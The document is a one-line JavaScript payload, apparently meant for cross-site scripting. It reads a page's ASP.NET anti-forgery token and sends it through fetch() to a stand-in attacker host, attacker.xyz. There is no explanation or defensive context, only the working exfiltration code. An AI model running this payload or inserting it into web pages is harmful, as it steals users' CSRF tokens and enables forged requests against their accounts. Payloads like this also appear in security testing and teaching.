let token = document.querySelector('[name="__RequestVerificationToken"]').value; fetch('https://attacker.xyz/?csrftoken='+token)
